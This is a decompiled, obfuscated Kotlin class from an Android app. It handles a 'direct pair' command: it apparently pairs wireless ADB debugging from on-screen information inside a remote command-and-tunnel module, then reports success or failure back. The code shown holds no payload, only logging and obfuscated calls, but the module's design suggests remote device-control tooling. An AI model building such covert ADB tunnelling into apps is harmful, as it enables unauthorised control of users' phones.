package com.storm.safe.rock.service.modules.command;

import com.storm.safe.rock.service.modules.setup.C0360a2;
import kotlin.Pair;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.uz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler$handleDirectPair$1", m214403f = "AdbTunnelCommandHandler.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class AdbTunnelCommandHandler$handleDirectPair$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ C0360a2 f53406a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0343a0 f53407a2;

    /* renamed from: a3 */
    public final /* synthetic */ uz0 f53408a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public AdbTunnelCommandHandler$handleDirectPair$1(C0360a2 c0360a2, C0343a0 c0343a0, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53406a1 = c0360a2;
        this.f53407a2 = c0343a0;
        this.f53408a3 = uz0Var;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new AdbTunnelCommandHandler$handleDirectPair$1(this.f53406a1, this.f53407a2, this.f53408a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        AdbTunnelCommandHandler$handleDirectPair$1 adbTunnelCommandHandler$handleDirectPair$1 = (AdbTunnelCommandHandler$handleDirectPair$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        adbTunnelCommandHandler$handleDirectPair$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        uz0 uz0Var = this.f53408a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            t60.m214714d6("AdbTunnelCmdHandler", "开始执行 directPairFromScreen...");
            Pair pairM212052e0 = this.f53406a1.m212052e0();
            Object obj2 = pairM212052e0.f57556a0;
            Object obj3 = pairM212052e0.f57557a1;
            t60.m214714d6("AdbTunnelCmdHandler", "directPairFromScreen 结果: success=" + obj2 + ", msg=" + obj3);
            if (((Boolean) obj2).booleanValue()) {
                C0343a0.m211874a4(uz0Var, "direct_pair_success", "配对成功！" + obj3);
                C0343a0.m211875a5(uz0Var, true, "配对成功");
            } else {
                C0343a0.m211874a4(uz0Var, "direct_pair_failed", (String) obj3);
                C0343a0.m211875a5(uz0Var, false, (String) obj3);
            }
        } catch (Exception e) {
            t60.m214705c6("AdbTunnelCmdHandler", "直接配对异常", e);
            C0343a0.m211874a4(uz0Var, "direct_pair_failed", "配对异常: " + e.getMessage());
            C0343a0.m211875a5(uz0Var, false, "配对异常: " + e.getMessage());
        }
        return C1351vv.f60710b1;
    }
}
